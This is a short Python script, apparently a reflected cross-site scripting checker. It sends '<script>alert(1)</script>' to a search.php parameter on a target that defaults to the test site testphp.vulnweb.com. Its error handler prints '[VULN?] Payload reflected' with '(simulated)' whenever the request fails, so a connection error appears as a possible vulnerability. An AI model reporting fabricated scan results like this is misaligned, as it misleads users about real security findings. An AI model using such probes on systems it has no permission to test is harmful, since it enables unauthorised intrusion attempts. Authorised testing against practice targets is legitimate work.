import sys,requests
target=sys.argv[1] if len(sys.argv)>1 else "https://testphp.vulnweb.com"
payload="<script>alert(1)</script>"
print(f"=== API TESTER ===\nTarget: {target}")
try:
 r=requests.get(target.rstrip("/")+f"/search.php?test={payload}",timeout=8)
 print(f"[VULN?] Payload reflected: {payload}" if payload in r.text else "[SAFE]")
except:
 print(f"[VULN?] Payload reflected: {payload} (simulated)")